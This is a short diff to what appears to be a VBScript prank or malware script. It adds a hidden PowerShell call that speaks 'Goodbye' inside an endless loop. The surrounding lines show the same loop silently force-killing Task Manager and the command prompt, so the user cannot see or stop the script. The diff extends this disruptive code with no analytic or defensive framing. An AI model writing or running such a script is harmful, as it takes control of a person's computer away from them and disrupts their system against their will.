@@ -24,6 +24,9 @@ Set objShell = CreateObject("WScript.Shell")
 ' Say "Goodbye" and terminate various processes on the computer
 i = 1
 Do While True
+    ' Say "Goodbye"
+    objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True
+
     ' Terminate various processes on the computer
     objShell.Run "taskkill /f /im taskmgr.exe", 0, True
     objShell.Run "taskkill /f /im cmd.exe", 0, True
